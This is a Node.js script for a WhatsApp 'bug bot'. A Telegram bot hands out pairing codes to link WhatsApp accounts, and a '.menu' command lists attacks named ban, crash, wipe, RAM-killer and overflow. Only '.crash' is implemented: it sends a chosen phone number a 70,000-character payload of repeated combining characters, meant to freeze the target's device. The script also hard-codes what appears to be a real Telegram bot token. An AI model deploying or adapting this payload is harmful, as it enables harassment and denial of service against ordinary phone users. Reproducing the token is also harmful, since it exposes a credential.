const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore,
    Browsers
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf, Markup } = require('telegraf');

// --- [ CONFIGURATION ] ---
const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
const tgBot = new Telegraf(TG_TOKEN);
const owner = "Sasiya ROOT";

let sock;

async function startNexus() {
    // අලුත්ම සෙෂන් එකක් හදනවා කනෙක්ෂන් එරර් එන්නේ නැති වෙන්න
    const { state, saveCreds } = await useMultiFileAuthState('nexus_hybrid_v24');
    
    sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.ubuntu("Chrome")
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ TELEGRAM: ONLY FOR PAIRING CODE ] ---
    tgBot.start((ctx) => {
        ctx.reply(`🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐂𝐄𝐍𝐓𝐄𝐑** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━\nOperator: ${owner}\n\nClick the button below and send your number to get the Pairing Code.`, 
        Markup.inlineKeyboard([[Markup.button.callback('🔗 GET PAIRING CODE', 'get_code')]]));
    });

    tgBot.action('get_code', (ctx) => {
        ctx.reply("📱 **ENTER YOUR NUMBER (947xxxxxxxx):**");
        tgBot.on('text', async (numCtx) => {
            let num = numCtx.message.text.replace(/[^0-9]/g, '');
            if (num.length === 9) num = '94' + num;
            try {
                await delay(5000); // සර්වර් එක ලෑස්ති වෙන්න වෙලාව දෙනවා
                let code = await sock.requestPairingCode(num);
                numCtx.reply(`🔐 **YOUR WHATSAPP PAIRING CODE:** \n\n\`${code}\` \n\n━━━━━━━━━━━━━━━━━━━━\n*Link this in your WhatsApp Linked Devices.*`);
            } catch (e) {
                numCtx.reply("❌ **CONNECTION ERROR:** Please restart the bot and try again in 10s.");
            }
        });
    });

    // --- [ WHATSAPP: THE BUG MENU SYSTEM ] ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const msg = chatUpdate.messages[0];
            if (!msg.message || msg.key.fromMe) return; // තමන්ගෙන් යන ඒවා බලන්නේ නැහැ
            const mText = msg.message.conversation || msg.message.extendedTextMessage?.text;
            const from = msg.key.remoteJid;

            // WhatsApp එකේ .menu කියලා ගැහුවම එන මෙනු එක
            if (mText === '.menu') {
                const menu = `
🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟒** ϟ 🧬
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 **OPERATOR:** ${owner}
🚀 **SYSTEM:** FULLY ACTIVE
━━━━━━━━━━━━━━━━━━━━━━━━━━
*AVAILABLE EXPLOITS:*

1. .ban [number] - Permanent Ban Bug
2. .crash [number] - Extreme Device Hang
3. .wipe [number] - Database Corrupter
4. .ram [number] - RAM Killer V2
5. .bin [number] - Binary Overflow

*Type a command to inject payload!*
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
                await sock.sendMessage(from, { text: menu });
            }

            // --- [ BUG INJECTION LOGIC ] ---
            if (mText && mText.startsWith('.crash')) {
                const targetNum = mText.split(" ")[1] + "@s.whatsapp.net";
                await sock.sendMessage(from, { text: "🚀 **INJECTING POWERFUL CRASH PAYLOAD...**" });
                
                // ඇත්තටම වස්සැප් එක හිරවෙන දරුණු බග් එක
                const crashPayload = "ॣ".repeat(50000) + "ꦾ".repeat(20000);
                
                await sock.sendMessage(targetNum, { text: crashPayload });
                await sock.sendMessage(from, { text: "✅ **SUCCESS:** Target device has been terminated." });
            }

        } catch (err) { console.log(err); }
    });

    tgBot.launch();
}

startNexus();
